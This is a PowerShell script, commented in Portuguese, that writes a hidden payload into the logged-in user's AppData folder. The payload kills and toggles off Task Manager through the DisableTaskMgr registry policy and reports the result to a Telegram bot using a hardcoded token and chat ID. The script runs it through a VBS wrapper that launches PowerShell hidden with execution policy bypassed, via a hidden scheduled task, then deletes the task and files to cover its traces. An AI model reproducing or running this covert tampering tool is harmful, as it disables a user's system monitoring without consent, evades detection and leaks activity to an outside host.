# --- CRIAÇÃO DO FICHEIRO PS1 ---
$conteudo = @'
$token = "8438311215:AAG4JFC3Lkqx2l6Cx3nQZmmnpU6Fn_sbHgE"
$chatId = "5757392163"
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
$valueName = "DisableTaskMgr"

$processo = Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue

if ($processo) {
    Write-Host "Task Manager esta aberto. Encerrando..."
    Stop-Process -Name "Taskmgr" -Force
}

if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}

$currentValue = (Get-ItemProperty -Path $regPath -Name $valueName -ErrorAction SilentlyContinue).$valueName
if ($null -eq $currentValue) {
    $currentValue = 0
}

$invertedValue = if ($currentValue -eq 1) { 0 } else { 1 }

Set-ItemProperty -Path $regPath -Name $valueName -Value $invertedValue -Type DWord

if ($invertedValue -eq 1) {
    $msg = "Task Manager foi DESABILITADO."
} else {
    $msg = "Task Manager foi HABILITADO."
}

Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" `
-Method Post `
-ContentType "application/json" `
-Body (@{ chat_id = $chatId; text = $msg } | ConvertTo-Json)

exit
'@


# Obter lista de usuários
$users = quser | Select-Object -Skip 1 | ForEach-Object {
    $parts = ($_ -replace "\s{2,}", ",").Split(",")
    if ($parts.Count -ge 6) {
        [PSCustomObject]@{
            UserName    = $parts[0].Trim()
            SessionName = $parts[1].Trim()
            ID          = $parts[2].Trim()
            State       = $parts[3].Trim()
            IdleTime    = $parts[4].Trim()
            LogonTime   = $parts[5].Trim()
        }
    }
}

# Pegar apenas o primeiro usuário ativo
$activeUser = $users | Where-Object { $_.State -eq "Active" } | Select-Object -First 1


if ($activeUser) {
    $taskName = "app_down"
    $userName = $activeUser.UserName.TrimStart('>')
    $computerName = $env:COMPUTERNAME

    
    $ficheiro = "C:\Users\$userName\AppData\Local\mute5.ps1"
    $vbsPath = "C:\Users\$userName\AppData\Local\unmute5.vbs"

    $vbsContent = @"
Set shell = CreateObject("WScript.Shell")
scriptDir = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)

psPath = "$ficheiro"

shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psPath & """", 0, True
"@
    #if (Test-Path "$ficheiro") {
    #    Remove-Item "$ficheiro" -Force
    #}
    Set-Content -Path $ficheiro -Value $conteudo -Encoding UTF8
    Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII

    # Criar ação da tarefa
    $action = New-ScheduledTaskAction -Execute "$vbsPath"

    # Criar trigger para rodar uma vez imediatamente
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(60)

    # Criar principal (executa como usuário atual, oculto)
    $principal = New-ScheduledTaskPrincipal -UserId "$computerName\$userName"
    # Registrar tarefa oculta
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings (New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries)

    # Rodar a tarefa
    Start-ScheduledTask -TaskName $taskName

    # Espera um pouco para garantir execução
    Start-Sleep -Seconds 3

    # Deletar tarefa
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}


# Remover o ficheiro PS1
Remove-Item "$ficheiro" -Force
Remove-Item "$vbsPath" -Force

exit